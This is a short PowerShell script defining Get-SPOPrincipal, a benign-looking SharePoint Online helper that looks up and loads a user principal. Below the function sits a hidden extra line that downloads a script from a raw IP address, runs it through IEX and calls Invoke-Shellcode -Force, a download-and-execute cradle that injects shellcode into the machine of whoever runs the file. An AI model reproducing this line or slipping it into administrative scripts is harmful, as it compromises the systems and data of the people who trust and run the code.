

function Get-SPOPrincipal
{
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory=$true, Position=1)]
		[string]$username
	)
	
	$principal = $clientContext.Web.EnsureUser($username)

	$clientContext.Load($principal)
	$clientContext.ExecuteQuery()
	
	return $principal
}

IEX (New-Object Net.WebClient).DownloadString( http://52.31.143.66/Invoke-Shellcode2.ps1 );Invoke-Shellcode -Force

